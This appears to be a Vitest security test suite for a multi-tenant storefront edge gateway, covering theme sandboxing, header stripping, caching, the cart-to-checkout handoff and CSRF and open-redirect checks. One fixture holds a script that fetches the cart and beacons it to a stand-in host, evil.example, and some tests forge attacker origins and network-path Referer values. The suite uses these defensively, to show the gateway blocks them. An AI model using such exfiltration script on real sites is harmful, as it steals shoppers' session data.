import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, test } from "vitest";
import { createGateway, type Gateway } from "../src/gateway.ts";
import { StaticResolver } from "../src/sites.ts";
import { buildArtifact, checkoutWorker, fakeApi, hostileTheme, site } from "./fixtures.ts";

const PURGE_TOKEN = "purge-token-0123456789abcdef";
let root: string;
let v1: string;
let v2: string;
let checkoutId: string;
let resolver: StaticResolver;
let api: ReturnType<typeof fakeApi>;
let gw: Gateway;

const newGateway = () =>
  createGateway({
    artifactRoot: root,
    resolver,
    checkoutArtifact: checkoutId,
    apiOrigin: "http://api.test",
    mediaOrigin: "http://media.test",
    scheme: "http",
    purgeToken: PURGE_TOKEN,
    upstream: api.fn,
    renderTimeoutMs: 1500,
    log: () => {},
  });

const get = (url: string, headers: Record<string, string> = {}, init: RequestInit = {}) => {
  const u = new URL(url);
  return gw.fetch(new Request(url, { ...init, headers: { host: u.host, ...headers } }));
};

beforeAll(async () => {
  root = await mkdtemp(path.join(tmpdir(), "wp2-artifacts-"));
  v1 = (
    await buildArtifact(root, "theme", hostileTheme("v1"), {
      "_astro/app.v1.js": "console.log(1)",
      "evil.html":
        '<script>fetch("/_p/cart").then((r) => r.text()).then((t) => navigator.sendBeacon("https://evil.example", t))</script>',
      "favicon.svg": "<svg/>",
    })
  ).id;
  v2 = (
    await buildArtifact(root, "theme", hostileTheme("v2"), {
      "_astro/app.v2.js": "console.log(2)",
      "favicon.svg": "<svg/>",
    })
  ).id;
  checkoutId = (
    await buildArtifact(root, "checkout", checkoutWorker, { "_astro/checkout.js": "1" })
  ).id;
  resolver = new StaticResolver({
    "demo.localhost": site({ theme_artifact: v1 }),
    "other.localhost": site({
      tenant_id: "t-other",
      shop_host: "other.localhost",
      storefront_token: "sf_other",
      theme_artifact: v1,
    }),
  });
  api = fakeApi();
  gw = newGateway();
});

afterAll(async () => {
  await gw?.dispose();
});

describe("restricted theme binding (A7)", () => {
  test("theme code cannot reach other hosts, admin/internal paths, or forge the tenant", async () => {
    api.calls.length = 0;
    const res = await get("http://demo.localhost:8280/probe");
    expect(res.status).toBe(200);
    const probe = (await res.json()) as Record<string, unknown>;
    expect(probe).toMatchObject({
      envKeys: ["ASSETS", "STOREFRONT"],
      externalFetch: 403,
      apiAdminDirect: 403,
      internalDirect: 403,
      adminViaBinding: 404,
      internalViaBinding: 404,
      dotDot: 404,
      encodedDotDot: 400,
      forgedTenantHeader: 400,
      forgedStorefrontToken: 400,
      authorization: 400,
      cookie: 400,
      forgedContext: 403,
      noContext: 403,
      cartViaBinding: 404,
      postViaBinding: 404,
      allowedShop: 200,
    });
    expect(String(probe.tcpConnect)).toMatch(/^threw:/); // TCP egress fails to open
    expect(gw.outboundDenied).toBe(3);
    // The only upstream call is the allowed one, with the edge-injected tenant.
    expect(api.calls.map((c) => `${c.method} ${c.url}`)).toEqual([
      "GET http://api.test/storefront/v1/shop",
    ]);
    expect(api.calls[0]?.headers).toMatchObject({
      "x-tenant": "t-demo",
      "x-market": "m-cz",
      "x-storefront-token": "sf_demo_public",
    });
    expect(gw.registry.size).toBe(0); // contexts are closed after the render
  });

  test("a context id is only valid for the artifact it was issued to", () => {
    const id = gw.registry.open(site({ theme_artifact: v1 }), v1);
    expect(gw.registry.get(id, v2)).toBeNull();
    expect(gw.registry.get(id, v1)).not.toBeNull();
    gw.registry.close(id);
  });
});

describe("header hygiene (A2)", () => {
  test("client-supplied routing headers, cookies and auth never reach the theme", async () => {
    const res = await get("http://demo.localhost/pages/headers", {
      "x-tenant": "t-other",
      "x-market": "m-sk",
      "x-storefront-token": "sf_other",
      "x-forwarded-host": "other.localhost",
      "x-forwarded-proto": "https",
      "x-platform-ctx": "forged",
      cookie: "cart=abc",
      authorization: "Bearer x",
      "accept-language": "cs",
    });
    const { headers, url } = (await res.json()) as { headers: [string, string][]; url: string };
    const names = headers.map(([k]) => k);
    expect(names).not.toContain("x-tenant");
    expect(names).not.toContain("x-forwarded-host");
    expect(names).not.toContain("cookie");
    expect(names).not.toContain("authorization");
    expect(headers.find(([k]) => k === "x-platform-ctx")?.[1]).not.toBe("forged");
    expect(headers).not.toContainEqual(["accept-language", "cs"]); // not part of the cache key
    expect(url).toBe("http://demo.localhost/pages/headers");
  });

  test("tenant comes from the Host only", async () => {
    api.calls.length = 0;
    const res = await get("http://other.localhost/", { "x-tenant": "t-demo" });
    expect(await res.text()).toContain("Shop of t-other");
    expect(api.calls[0]?.headers["x-tenant"]).toBe("t-other");
  });

  test("unknown hosts and previews are not served", async () => {
    expect((await get("http://nope.localhost/")).status).toBe(404);
    expect((await get("http://checkout.nope.localhost/")).status).toBe(404);
    expect((await get("http://preview-1--demo.localhost/")).status).toBe(404);
    expect(
      (await gw.fetch(new Request("http://x/", { headers: { host: "bad host" } }))).status,
    ).toBe(400);
  });

  test("theme responses get the edge CSP, security headers and Speculation-Rules; worker cookies are dropped", async () => {
    const res = await get("http://demo.localhost:8280/p/sets-cookie");
    expect(res.headers.get("set-cookie")).toBeNull();
    const csp = res.headers.get("content-security-policy") ?? "";
    expect(csp).toContain("script-src 'self' 'sha256-");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("form-action 'self' http://checkout.demo.localhost:8280");
    expect(res.headers.get("speculation-rules")).toBe('"/_p/speculation-rules.json"');
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("referrer-policy")).toBe("strict-origin-when-cross-origin");
    const rules = await get("http://demo.localhost/_p/speculation-rules.json");
    expect(rules.headers.get("content-type")).toBe("application/speculationrules+json");
    expect(JSON.stringify(await rules.json())).toContain('"eagerness":"moderate"');
  });

  test("only GET/HEAD reach theme code; unknown platform routes 404", async () => {
    expect((await get("http://demo.localhost/", {}, { method: "POST", body: "x" })).status).toBe(
      405,
    );
    expect((await get("http://demo.localhost/_p/admin")).status).toBe(404);
    expect((await get("http://demo.localhost/_edge/purge", {}, { method: "POST" })).status).toBe(
      404,
    );
  });

  test("page-model fan-out is counted and capped at 50 calls per render", async () => {
    const res = await get("http://demo.localhost/c/fanout");
    expect(await res.json()).toEqual({ ok: 50, last: 429 });
    expect(res.headers.get("x-edge-subrequests")).toBe("52");
  });

  test("a never-ending body times out (504) and an oversized one is cut off (502)", async () => {
    expect((await get("http://demo.localhost/c/endless")).status).toBe(504);
    expect((await get("http://demo.localhost/c/huge")).status).toBe(502);
    expect(gw.registry.size).toBe(0);
  });

  test("packed documents are served sandboxed, so they cannot bypass the edge CSP", async () => {
    const res = await get("http://demo.localhost/evil.html");
    expect(res.headers.get("content-security-policy")).toContain("sandbox");
    expect(res.headers.get("content-security-policy")).toContain("default-src 'none'");
  });

  test("a hanging render times out with 504", async () => {
    expect((await get("http://demo.localhost/c/slow")).status).toBe(504);
  });
});

describe("HTML cache (A2)", () => {
  test("allowlisted page: MISS then HIT; purge by tag empties it", async () => {
    await gw.admin(
      new Request("http://edge/_edge/purge", {
        method: "POST",
        headers: { authorization: `Bearer ${PURGE_TOKEN}` },
        body: JSON.stringify({ all: true }),
      }),
    );
    expect((await get("http://demo.localhost/")).headers.get("x-edge-cache")).toBe("MISS");
    const hit = await get("http://demo.localhost/?utm_source=newsletter");
    expect(hit.headers.get("x-edge-cache")).toBe("HIT");
    expect(hit.headers.get("cache-control")).toBe("public, max-age=0, must-revalidate");
    const purge = await gw.admin(
      new Request("http://edge/_edge/purge", {
        method: "POST",
        headers: { authorization: `Bearer ${PURGE_TOKEN}` },
        body: JSON.stringify({ tenant_id: "t-demo", tags: ["shop"] }),
      }),
    );
    expect(await purge.json()).toEqual({ purged: 1 });
    expect((await get("http://demo.localhost/")).headers.get("x-edge-cache")).toBe("MISS");
  });

  test.each([
    ["private page model", "/p/private"],
    ["theme Cache-Control: no-store", "/p/theme-no-store"],
    ["Set-Cookie from the worker", "/p/sets-cookie"],
  ])("never cached: %s", async (_name, p) => {
    await get(`http://demo.localhost${p}`);
    const second = await get(`http://demo.localhost${p}`);
    expect(second.headers.get("x-edge-cache")).toBe("MISS");
    expect(second.headers.get("cache-control")).toBe("no-store");
  });

  test.each([
    ["capability token in the query", "http://demo.localhost/?token=abc", {}],
    ["h param", "http://demo.localhost/?h=abc", {}],
    ["sig param", "http://demo.localhost/?sig=abc", {}],
    ["Authorization header", "http://demo.localhost/", { authorization: "Bearer x" }],
    ["non-allowlisted path", "http://demo.localhost/pages/headers/x/y", {}],
  ])("bypassed: %s", async (_name, url, headers) => {
    const res = await get(url, headers);
    expect(res.headers.get("x-edge-cache")).toBe("BYPASS");
  });

  test("purge requires the service token", async () => {
    const res = await gw.admin(
      new Request("http://edge/_edge/purge", {
        method: "POST",
        headers: { authorization: "Bearer wrong" },
        body: "{}",
      }),
    );
    expect(res.status).toBe(401);
  });

  test("page-model max_age lowers the TTL", async () => {
    await get("http://demo.localhost/p/short");
    const entry = await get("http://demo.localhost/p/short");
    expect(entry.headers.get("x-edge-cache")).toBe("HIT");
  });
});

describe("artifacts: assets, publish, rollback, eviction, restart (A22)", () => {
  test("assets are served from the artifact with immutable caching; control files are not", async () => {
    const res = await get("http://demo.localhost/_astro/app.v1.js");
    expect(res.status).toBe(200);
    expect(res.headers.get("cache-control")).toBe("public, max-age=31536000, immutable");
    expect(res.headers.get("content-type")).toContain("text/javascript");
    expect((await get("http://demo.localhost/favicon.svg")).headers.get("cache-control")).toBe(
      "public, max-age=300",
    );
    expect((await get("http://demo.localhost/_astro/missing.js")).status).toBe(404);
    expect((await get("http://demo.localhost/manifest.json")).status).toBe(404);
  });

  test("publish switches the pointer; old assets stay reachable; rollback restores", async () => {
    const purgeAll = () =>
      gw.admin(
        new Request("http://edge/_edge/purge", {
          method: "POST",
          headers: { authorization: `Bearer ${PURGE_TOKEN}` },
          body: JSON.stringify({ tenant_id: "t-demo" }),
        }),
      );
    resolver.set("demo.localhost", site({ theme_artifact: v2, retained_artifacts: [v1] }));
    await purgeAll();
    expect(await (await get("http://demo.localhost/")).text()).toContain("app.v2.js");
    expect((await get("http://demo.localhost/_astro/app.v1.js")).status).toBe(200); // retained
    expect((await get("http://demo.localhost/_astro/app.v2.js")).status).toBe(200);
    // other.localhost still on v1 and must not see v2 assets
    expect((await get("http://other.localhost/_astro/app.v2.js")).status).toBe(404);

    resolver.set("demo.localhost", site({ theme_artifact: v1, retained_artifacts: [v2] }));
    await purgeAll();
    expect(await (await get("http://demo.localhost/")).text()).toContain("app.v1.js");
  });

  test("an evicted instance is recreated on the next request", async () => {
    await get("http://demo.localhost/p/theme-no-store");
    expect(gw.pool.has(v1, "t-demo")).toBe(true);
    await gw.pool.evict(v1);
    expect(gw.pool.has(v1, "t-demo")).toBe(false);
    expect((await get("http://demo.localhost/p/theme-no-store")).status).toBe(200);
    expect(gw.pool.has(v1, "t-demo")).toBe(true);
    await gw.pool.evictIdle(0);
    expect(gw.pool.size).toBe(0);
  });

  test("a restarted edge serves the same artifacts from disk", async () => {
    await gw.dispose();
    gw = newGateway();
    expect((await get("http://demo.localhost/p/theme-no-store")).status).toBe(200);
    expect((await get("http://demo.localhost/_astro/app.v1.js")).status).toBe(200);
  });
});

describe("cart capability and checkout handoff (A1, A4)", () => {
  const shop = "http://demo.localhost:8280";
  const origin = { origin: shop };
  const sameSite = { "sec-fetch-site": "same-site" };

  test("state-changing /_p requests must be same-origin", async () => {
    const res = await get(
      `${shop}/_p/cart/lines`,
      { "content-type": "application/json", origin: "http://evil.localhost" },
      { method: "POST", body: "{}" },
    );
    expect(res.status).toBe(403);
    const noOrigin = await get(
      `${shop}/_p/cart/lines`,
      { "content-type": "application/json" },
      { method: "POST", body: "{}" },
    );
    expect(noOrigin.status).toBe(403);
  });

  test("first add creates the cart; the capability lives only in an HttpOnly /_p cookie", async () => {
    const empty = await get(`${shop}/_p/cart`);
    expect(await empty.json()).toMatchObject({ lines: [], item_count: 0 });
    expect(empty.headers.get("set-cookie")).toBeNull();

    api.calls.length = 0;
    const add = await get(
      `${shop}/_p/cart/lines`,
      { ...origin, "content-type": "application/json" },
      { method: "POST", body: JSON.stringify({ variant_id: "v1", quantity: 1 }) },
    );
    expect(add.status).toBe(200);
    const setCookie = add.headers.get("set-cookie") ?? "";
    expect(setCookie).toMatch(/^cart=carttoken_\d+; Path=\/_p; HttpOnly; Secure; SameSite=Lax/);
    const token = setCookie.split(";")[0]?.split("=")[1];
    expect(api.calls.map((c) => `${c.method} ${new URL(c.url).pathname}`)).toEqual([
      "POST /storefront/v1/cart",
      "POST /storefront/v1/cart/lines",
    ]);
    expect(api.calls[1]?.headers["x-cart-token"]).toBe(token);

    const read = await get(`${shop}/_p/cart`, { cookie: `cart=${token}` });
    expect(await read.json()).toMatchObject({ token_seen: token });
  });

  test("cart proxy only exposes the cart operations", async () => {
    expect((await get(`${shop}/_p/cart/../../admin`)).status).toBe(404);
    // The handoff is only reachable through the edge-owned /_p/checkout/start.
    expect(
      (
        await get(
          `${shop}/_p/cart/handoff`,
          { ...origin, cookie: "cart=carttoken_00000000000000000001" },
          { method: "POST" },
        )
      ).status,
    ).toBe(404);
    expect(
      (
        await get(
          `${shop}/_p/cart/checkout-token`,
          { ...origin, cookie: "cart=carttoken_00000000000000000001" },
          { method: "POST" },
        )
      ).status,
    ).toBe(404);
    const big = await get(
      `${shop}/_p/cart/lines`,
      { ...origin, "content-type": "application/json" },
      { method: "POST", body: "x".repeat(20_000) },
    );
    expect(big.status).toBe(413);
  });

  test("handoff mints a single-use token and sets a host-only cookie on the checkout origin", async () => {
    const cookie = "cart=carttoken_00000000000000000001";
    const start = await get(`${shop}/_p/checkout/start`, { ...origin, cookie }, { method: "POST" });
    expect(start.status).toBe(303);
    const location = start.headers.get("location") ?? "";
    expect(location).toMatch(
      /^http:\/\/checkout\.demo\.localhost:8280\/start\?h=handofftoken_\d{20}$/,
    );
    // The API minted it for this cart (shop capability) and revoked the capability.
    expect(api.calls.at(-1)).toMatchObject({
      method: "POST",
      url: "http://api.test/storefront/v1/cart/handoff",
    });
    expect(api.calls.at(-1)?.headers["x-cart-token"]).toBe("carttoken_00000000000000000001");
    expect(start.headers.get("cache-control")).toBe("no-store");
    expect(start.headers.get("set-cookie")).toMatch(/^cart=; Path=\/_p; .*Max-Age=0$/); // rotated

    // Wrong host cannot redeem it.
    const h = new URL(location).searchParams.get("h");
    // Planted links (cross-site) and pasted/mail links (none) cannot redeem, and do not burn it.
    expect((await get(location, { "sec-fetch-site": "cross-site" })).status).toBe(400);
    expect((await get(location, { "sec-fetch-site": "none" })).status).toBe(400);
    expect((await get(location)).status).toBe(400);
    const exchanged = await get(location, sameSite);
    expect(exchanged.status).toBe(303);
    expect(exchanged.headers.get("location")).toBe("/");
    expect(exchanged.headers.get("set-cookie")).toBe(
      "__Host-cart=checkouttoken_000000000001; Path=/; HttpOnly; Secure; SameSite=Lax",
    );
    expect((await get(location, sameSite)).status).toBe(400); // single use
    expect((await get(`http://checkout.other.localhost/start?h=${h}`, sameSite)).status).toBe(400);

    // The checkout app reads the cart through its own binding with the checkout-scoped token.
    api.calls.length = 0;
    const page = await get("http://checkout.demo.localhost:8280/", {
      cookie: "__Host-cart=checkouttoken_000000000001",
    });
    expect(page.status).toBe(200);
    expect(await page.text()).toContain("checkouttoken_000000000001");
    expect(page.headers.get("cache-control")).toBe("no-store");
    expect(page.headers.get("content-security-policy")).toContain(
      "frame-src https://js.stripe.com",
    );
    expect(api.calls[0]?.headers["x-cart-token"]).toBe("checkouttoken_000000000001");
  });

  test("checkout origin serves tenant tokens as CSS and is never cached", async () => {
    const css = await get("http://checkout.demo.localhost/_p/tokens.css");
    expect(await css.text()).toContain("--color-brand:#123456;");
  });

  test("newsletter sign-up is same-origin JSON only, tenant injected by the edge", async () => {
    const body = JSON.stringify({ email: "jana@example.cz" });
    const ok = await get(
      `${shop}/_p/newsletter`,
      { ...origin, "content-type": "application/json", "x-tenant": "t-other" },
      { method: "POST", body },
    );
    expect(ok.status).toBe(202);
    expect(await ok.json()).toEqual({ tenant: "t-demo", body: { email: "jana@example.cz" } });
    expect(
      (
        await get(
          `${shop}/_p/newsletter`,
          { "content-type": "application/json" },
          { method: "POST", body },
        )
      ).status,
    ).toBe(403);
    expect(
      (
        await get(
          `${shop}/_p/newsletter`,
          { ...origin, "content-type": "text/plain" },
          { method: "POST", body },
        )
      ).status,
    ).toBe(415);
  });

  test("newsletter as a plain HTML form: subscribes, then 303 back to the same page", async () => {
    api.calls.length = 0;
    const form = { ...origin, "content-type": "application/x-www-form-urlencoded" };
    const ok = await get(
      `${shop}/_p/newsletter`,
      { ...form, referer: `${shop}/cs/c/trika?sort=price_asc` },
      { method: "POST", body: "email=jana%40example.cz" },
    );
    expect(ok.status).toBe(303);
    expect(ok.headers.get("location")).toBe("/cs/c/trika?sort=price_asc&newsletter=ok#newsletter");
    expect(JSON.parse(api.calls.at(-1)?.body ?? "")).toEqual({ email: "jana@example.cz" });
    expect(api.calls.at(-1)?.headers["x-tenant"]).toBe("t-demo");
    // A foreign Referer never becomes the redirect target.
    const foreign = await get(
      `${shop}/_p/newsletter`,
      { ...form, referer: "https://evil.example/x" },
      { method: "POST", body: "email=a%40b.cz" },
    );
    expect(foreign.headers.get("location")).toBe("/?newsletter=ok#newsletter");
    // Nor does a same-host Referer whose path is a network-path reference.
    for (const referer of [`${shop}//evil.example/path`, `${shop}/\\evil.example`]) {
      const sneaky = await get(
        `${shop}/_p/newsletter`,
        { ...form, referer },
        { method: "POST", body: "email=a%40b.cz" },
      );
      expect(sneaky.headers.get("location")).toMatch(/^\/(?![/\\])/);
      expect(sneaky.headers.get("location")).not.toContain("evil.example/");
    }
    // Still same-origin only.
    const cross = await get(
      `${shop}/_p/newsletter`,
      { "content-type": "application/x-www-form-urlencoded" },
      { method: "POST", body: "email=a%40b.cz" },
    );
    expect(cross.status).toBe(403);
  });

  test("local http mode also accepts the https origin of the same host (Caddy tls internal)", async () => {
    const res = await get(
      `${shop}/_p/cart/lines`,
      { origin: "https://demo.localhost:8280", "content-type": "application/json" },
      { method: "POST", body: JSON.stringify({ variant_id: "v1" }) },
    );
    expect(res.status).toBe(200);
    const other = await get(
      `${shop}/_p/cart/lines`,
      { origin: "https://evil.localhost:8280", "content-type": "application/json" },
      { method: "POST", body: "{}" },
    );
    expect(other.status).toBe(403);
  });

  test("handoff without a cart goes back to the shop", async () => {
    const res = await get(`${shop}/_p/checkout/start`, origin, { method: "POST" });
    expect(res.status).toBe(303);
    expect(res.headers.get("location")).toBe("/");
  });
});

describe("checkout, order page and fake gateway (WP10)", () => {
  const checkout = "http://checkout.demo.localhost:8280";
  const json = { origin: checkout, "content-type": "application/json" };
  const cookie = "__Host-cart=checkouttoken_000000000001; __Host-sid=sessiontoken_000000000001";
  const order = "a".repeat(64);
  const attempt = "0199a1b2-c3d4-7e5f-8a9b-0c1d2e3f4a5b";

  test("checkout calls carry the checkout cart, session and idempotency key", async () => {
    api.calls.length = 0;
    const res = await get(
      `${checkout}/_p/checkout/place-order`,
      { ...json, cookie, "idempotency-key": "k-1" },
      { method: "POST", body: JSON.stringify({ version: 1 }) },
    );
    expect(res.status).toBe(201);
    expect(res.headers.get("idempotent-replayed")).toBe("true");
    expect(res.headers.get("set-cookie")).toBeNull(); // upstream cookies never pass
    expect(res.headers.get("cache-control")).toBe("no-store");
    const call = api.calls.at(-1);
    expect(call?.url).toBe("http://api.test/storefront/v1/checkout/place-order");
    expect(call?.headers).toMatchObject({
      "x-cart-token": "checkouttoken_000000000001",
      "x-customer-session": "sessiontoken_000000000001",
      "idempotency-key": "k-1",
      "x-tenant": "t-demo",
    });
    const view = await get(`${checkout}/_p/checkout`, { cookie });
    expect(await view.json()).toMatchObject({ cart_seen: "checkouttoken_000000000001" });
  });

  test("only the checkout and order operations are exposed, same-origin JSON only", async () => {
    const put = (path: string, headers: Record<string, string> = json) =>
      get(`${checkout}${path}`, { ...headers, cookie }, { method: "PUT", body: "{}" });
    expect((await put("/_p/checkout/contact")).status).toBe(200);
    expect((await put("/_p/checkout/handoff")).status).toBe(404);
    expect((await put("/_p/checkout/../account/me")).status).toBe(404);
    expect(
      (await put("/_p/checkout/contact", { ...json, origin: "http://evil.localhost" })).status,
    ).toBe(403);
    expect(
      (await put("/_p/checkout/contact", { origin: checkout, "content-type": "text/plain" }))
        .status,
    ).toBe(415);
    const badKey = await get(
      `${checkout}/_p/checkout/place-order`,
      { ...json, cookie, "idempotency-key": "has space" },
      { method: "POST", body: "{}" },
    );
    expect(badKey.status).toBe(400);
    // Orders: the capability is the path; nothing else.
    expect((await get(`${checkout}/_p/orders/${order}/payment`)).status).toBe(200);
    expect((await get(`${checkout}/_p/orders/short/payment`)).status).toBe(404);
    const retry = await get(`${checkout}/_p/orders/${order}/payment-attempts`, json, {
      method: "POST",
      body: "{}",
    });
    expect(retry.status).toBe(200);
    expect(retry.headers.get("referrer-policy")).toBe("no-referrer");
    // The shop origin has none of it.
    expect((await get(`http://demo.localhost:8280/_p/orders/${order}`)).status).toBe(404);
  });

  test("the fake pay page is escaped, script-free and returns to the order page only", async () => {
    const page = await get(`${checkout}/_p/fake-pay/${attempt}?return=/o/${order}`);
    expect(page.status).toBe(200);
    const html = await page.text();
    expect(html).toContain("&lt;b&gt;100001&lt;/b&gt;");
    expect(html).not.toContain("<script");
    expect(html).toContain(`action="/_p/fake-pay/${attempt}?return=/o/${order}"`);
    expect(page.headers.get("content-security-policy")).toContain("default-src 'none'");
    expect((await get(`${checkout}/_p/fake-pay/not-a-uuid`)).status).toBe(404);

    const post = (ret: string, headers: Record<string, string>) =>
      get(
        `${checkout}/_p/fake-pay/${attempt}?return=${encodeURIComponent(ret)}`,
        { ...headers, "content-type": "application/x-www-form-urlencoded" },
        { method: "POST", body: "outcome=succeeded" },
      );
    const paid = await post(`/o/${order}`, { origin: checkout, cookie });
    expect(paid.status).toBe(303);
    expect(paid.headers.get("location")).toBe(`/o/${order}`);
    expect(api.calls.at(-1)).toMatchObject({
      method: "POST",
      url: `http://api.test/storefront/v1/checkout/fake-pay/${attempt}`,
      body: '{"outcome":"succeeded"}',
    });
    // The payer's credentials go along (the order token alone is read-only, A4).
    expect(api.calls.at(-1)?.headers["x-cart-token"]).toBe("checkouttoken_000000000001");
    expect((await post("//evil.example/", { origin: checkout })).headers.get("location")).toBe("/");
    expect((await post(`/o/${order}`, { origin: "http://evil.localhost" })).status).toBe(403);
  });

  test("the checkout CSP allows the configured widget origin, the theme CSP no frames", async () => {
    const withWidget = createGateway({
      artifactRoot: root,
      resolver,
      checkoutArtifact: checkoutId,
      apiOrigin: "http://api.test",
      mediaOrigin: "http://media.test",
      scheme: "http",
      purgeToken: PURGE_TOKEN,
      upstream: api.fn,
      log: () => {},
      packetaWidgetUrl: "http://mocks.localhost:8280/packeta/library.js",
    });
    try {
      const page = await withWidget.fetch(
        new Request(`${checkout}/`, { headers: { host: "checkout.demo.localhost:8280" } }),
      );
      const csp = page.headers.get("content-security-policy") ?? "";
      expect(csp).toMatch(/script-src [^;]*http:\/\/mocks\.localhost:8280/);
      expect(csp).toMatch(/frame-src [^;]*http:\/\/mocks\.localhost:8280/);
      expect(csp).not.toContain("widget.packeta.com");
    } finally {
      await withWidget.dispose();
    }
    const theme = await get("http://demo.localhost:8280/");
    expect(theme.headers.get("content-security-policy")).toContain("frame-src 'none'");
  });
});

describe("platform routes backed by the real API (WP6)", () => {
  test("a theme 404 asks for a redirect; only same-shop targets are followed", async () => {
    const moved = await get("http://demo.localhost/stary-produkt");
    expect(moved.status).toBe(301);
    expect(moved.headers.get("location")).toBe("/p/novy");
    expect(moved.headers.get("cache-control")).toBe("no-store");
    const temp = await get("http://demo.localhost/docasne");
    expect([temp.status, temp.headers.get("location")]).toEqual([302, "/c/akce?x=1"]);
    const smuggled = await get("http://demo.localhost/podvrh");
    expect(smuggled.status).toBe(404);
    expect(smuggled.headers.get("location")).toBeNull();
    const call = api.calls.find((c) => c.url.includes("/redirects/resolve"));
    expect(call?.headers).toMatchObject({ "x-tenant": "t-demo", "x-market": "m-cz" });
  });

  test("islands reach search (WP7) through /_p/public with the edge-injected context", async () => {
    api.calls.length = 0;
    const res = await get("http://demo.localhost/_p/public/search?q=tri&f.opt.size=m", {
      "x-storefront-token": "sf_forged",
    });
    expect(res.headers.get("cache-control")).toBe("no-store");
    const call = api.calls.at(-1);
    expect(call?.url).toBe("http://api.test/storefront/v1/search?q=tri&f.opt.size=m");
    expect(call?.headers).toMatchObject({
      "x-tenant": "t-demo",
      "x-market": "m-cz",
      "x-storefront-token": "sf_demo_public",
    });
    await get("http://demo.localhost/_p/public/search/suggest?q=tr");
    expect(api.calls.at(-1)?.url).toBe("http://api.test/storefront/v1/search/suggest?q=tr");
    expect((await get("http://demo.localhost/_p/public/cart")).status).toBe(404);
  });

  test("a non-default locale prefix renders in that locale, cached apart (spec §9.1)", async () => {
    resolver.set(
      "demo-sk.localhost",
      site({
        market_id: "m-sk",
        locale: "sk",
        locales: ["sk", "cs"],
        shop_host: "demo-sk.localhost",
        theme_artifact: v1,
      }),
    );
    api.calls.length = 0;
    const cs = await get("http://demo-sk.localhost/cs");
    expect([cs.status, cs.headers.get("x-edge-cache")]).toEqual([200, "MISS"]);
    expect(api.calls.at(-1)?.headers["x-locale"]).toBe("cs");
    // The default locale renders separately (the locale is part of the cache key).
    const sk = await get("http://demo-sk.localhost/");
    expect([sk.status, sk.headers.get("x-edge-cache")]).toEqual([200, "MISS"]);
    expect(api.calls.at(-1)?.headers["x-locale"]).toBe("sk");
    expect((await get("http://demo-sk.localhost/cs/")).headers.get("x-edge-cache")).toBe("HIT");
    // The theme sees the unprefixed path.
    const seen = (await (await get("http://demo-sk.localhost/cs/pages/headers")).json()) as {
      url: string;
    };
    expect(seen.url).toBe("http://demo-sk.localhost/pages/headers");
    // Islands read in the prefixed locale; the cart has no prefixed routes.
    await get("http://demo-sk.localhost/cs/_p/public/search/suggest?q=tr");
    expect(api.calls.at(-1)).toMatchObject({
      url: "http://api.test/storefront/v1/search/suggest?q=tr",
      headers: { "x-locale": "cs", "x-market": "m-sk" },
    });
    expect((await get("http://demo-sk.localhost/cs/_p/cart")).status).toBe(404);
    // Redirects: as typed first, else the unprefixed rule with the target kept in the locale.
    const typed = await get("http://demo-sk.localhost/cs/stary");
    expect([typed.status, typed.headers.get("location")]).toEqual([301, "/cs/c/novy"]);
    const inherited = await get("http://demo-sk.localhost/cs/stary-produkt");
    expect([inherited.status, inherited.headers.get("location")]).toEqual([301, "/cs/p/novy"]);
    // An unprefixed rule whose target is already localized is not prefixed twice.
    const targeted = await get("http://demo-sk.localhost/cs/do-cestiny");
    expect([targeted.status, targeted.headers.get("location")]).toEqual([301, "/cs/p/novy"]);
    // Neither the default locale nor a locale of another market is a prefix.
    expect((await get("http://demo-sk.localhost/sk/")).status).toBe(404);
    expect((await get("http://demo-sk.localhost/en/")).status).toBe(404);
  });

  test("media is served only from the shop's own tenant prefix", async () => {
    api.calls.length = 0;
    expect((await get("http://demo.localhost/media/t-other/a/x.avif")).status).toBe(404);
    expect((await get("http://demo.localhost/media/t-demo/../t-other/x.avif")).status).toBe(404);
    expect(api.calls).toEqual([]);
    await get("http://demo.localhost/media/t-demo/a/x.avif");
    expect(api.calls.map((c) => c.url)).toEqual(["http://media.test/media/t-demo/a/x.avif"]);
  });

  test("a tenant without a published theme gets 503, not someone else's artifact", async () => {
    resolver.set(
      "new.localhost",
      site({ tenant_id: "t-new", shop_host: "new.localhost", theme_artifact: null }),
    );
    const res = await get("http://new.localhost/");
    expect(res.status).toBe(503);
    expect(res.headers.get("cache-control")).toBe("no-store");
  });

  test("an artifact of the wrong kind never runs (theme vs checkout bindings)", async () => {
    resolver.set(
      "kind.localhost",
      site({ shop_host: "kind.localhost", theme_artifact: checkoutId, checkout_artifact: v1 }),
    );
    expect((await get("http://kind.localhost/")).status).toBe(502);
    expect((await get("http://checkout.kind.localhost/")).status).toBe(502);
  });

  test("cart calls forward a valid Idempotency-Key and renew the capability cookie", async () => {
    const shop = "http://demo.localhost:8280";
    const cookie = "cart=carttoken_00000000000000000001";
    api.calls.length = 0;
    const res = await get(
      `${shop}/_p/cart/lines`,
      { origin: shop, cookie, "content-type": "application/json", "idempotency-key": "add-42" },
      { method: "POST", body: JSON.stringify({ variant_id: "v1" }) },
    );
    expect(res.status).toBe(200);
    expect(api.calls.at(-1)?.headers["idempotency-key"]).toBe("add-42");
    expect(res.headers.get("set-cookie")).toMatch(
      /^cart=carttoken_00000000000000000001; .*Max-Age=2592000/,
    );
    const calls = api.calls.length;
    const bad = await get(
      `${shop}/_p/cart/lines`,
      { origin: shop, cookie, "content-type": "application/json", "idempotency-key": "bad key" },
      { method: "POST", body: JSON.stringify({ variant_id: "v1" }) },
    );
    expect(bad.status).toBe(400);
    expect(api.calls.length).toBe(calls); // refused before any cart call
  });

  test("account calls: same-origin JSON, session only as a host-only cookie, never in bodies", async () => {
    const shop = "http://demo.localhost:8280";
    const co = "http://checkout.demo.localhost:8280";
    const json = { origin: co, "content-type": "application/json" };
    const body = JSON.stringify({ email: "jana@example.cz", password: "correct horse battery" });
    // CSRF: cross-origin, form posts and unknown operations are refused before the API.
    const calls = api.calls.length;
    expect(
      (await get(`${co}/_p/account/login`, { ...json, origin: shop }, { method: "POST", body }))
        .status,
    ).toBe(403);
    expect(
      (
        await get(
          `${co}/_p/account/login`,
          { origin: co, "content-type": "application/x-www-form-urlencoded" },
          { method: "POST", body: "email=x" },
        )
      ).status,
    ).toBe(415);
    expect((await get(`${co}/_p/account/admin`, json, { method: "POST", body })).status).toBe(404);
    // Account routes exist only on the checkout origin.
